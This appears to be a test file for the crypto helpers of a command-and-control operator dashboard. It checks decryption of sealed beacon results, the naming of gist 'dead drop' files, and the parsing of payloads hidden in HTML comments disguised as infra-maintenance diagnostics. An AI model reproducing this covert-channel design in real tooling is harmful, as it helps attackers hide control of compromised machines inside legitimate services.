// dashboard/src/lib/__tests__/crypto.test.ts
// @vitest-environment node
import { describe, it, expect } from 'vitest';
import sodium from 'libsodium-wrappers';
import { decryptSealedResult } from '../crypto';

describe('decryptSealedResult', () => {
  it('decrypts a libsodium sealed-box message encrypted with the operator public key', async () => {
    await sodium.ready;

    // Generate a fresh operator keypair for the test
    const kp = sodium.crypto_box_keypair();

    // Simulate what a beacon does: seal-encrypt with operator public key
    const plaintext  = 'command output: root\n';
    const sealed     = sodium.crypto_box_seal(
      sodium.from_string(plaintext),
      kp.publicKey,
    );
    const sealedB64  = sodium.to_base64(sealed, sodium.base64_variants.URLSAFE_NO_PADDING);
    const privkeyB64 = sodium.to_base64(kp.privateKey, sodium.base64_variants.URLSAFE_NO_PADDING);

    // Decrypt using the operator private key
    const result = await decryptSealedResult(sealedB64, privkeyB64);
    expect(result).toBe(plaintext);
  });

  it('throws when the key is wrong', async () => {
    await sodium.ready;
    const kp1 = sodium.crypto_box_keypair();
    const kp2 = sodium.crypto_box_keypair();

    const sealed    = sodium.crypto_box_seal(sodium.from_string('secret'), kp1.publicKey);
    const sealedB64 = sodium.to_base64(sealed, sodium.base64_variants.URLSAFE_NO_PADDING);
    const wrongKey  = sodium.to_base64(kp2.privateKey, sodium.base64_variants.URLSAFE_NO_PADDING);

    await expect(decryptSealedResult(sealedB64, wrongKey)).rejects.toThrow(/decryption failed/i);
  });
});

import { deadDropGistKey } from '../crypto';

describe('deadDropGistKey', () => {
  it('returns the first 16 hex chars of sha256(beaconId)', async () => {
    // sha256("abc") hex = "ba7816bf8f01cfea414140de5dae2ec73b00361bbef0469393f4..."
    // First 16 chars: "ba7816bf8f01cfea"
    const key = await deadDropGistKey('abc');
    expect(key).toHaveLength(16);
    expect(key).toBe('ba7816bf8f01cfea');
  });

  it('formats the full gist filename correctly', async () => {
    const key = await deadDropGistKey('test-beacon-id');
    expect(`data-${key}.bin`).toMatch(/^data-[0-9a-f]{16}\.bin$/);
  });
});

import { parseMaintenanceDiagnosticPayload } from '../crypto';

describe('parseMaintenanceDiagnosticPayload()', () => {
  it('returns null when commentBody is null', () => {
    const result = parseMaintenanceDiagnosticPayload(null);
    expect(result).toBeNull();
  });

  it('returns null when no infra-diagnostic marker is present', () => {
    const commentBody = `<!-- infra-maintenance:550e8400-e29b-41d4-a716-446655440000 -->
Some visible content here`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBeNull();
  });

  it('returns the sealed payload embedded in the marker', () => {
    const commentBody = `<!-- infra-maintenance:550e8400-e29b-41d4-a716-446655440000 -->
Some visible content
<!-- infra-diagnostic:550e8400-e29b-41d4-a716-446655440001:dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA== -->`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBe('dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA==');
  });

  it('returns null when marker present but no payload embedded', () => {
    const commentBody = `<!-- infra-maintenance:550e8400-e29b-41d4-a716-446655440000 -->
Some visible content
<!-- infra-diagnostic:550e8400-e29b-41d4-a716-446655440001 -->`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBeNull();
  });

  it('handles extra whitespace inside the marker', () => {
    const commentBody = `<!--  infra-diagnostic:550e8400-e29b-41d4-a716-446655440000:dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA==  -->`;
    const result = parseMaintenanceDiagnosticPayload(commentBody);
    expect(result).toBe('dGVzdF9wYXlsb2FkX2Jhc2U2NHVybA==');
  });
});
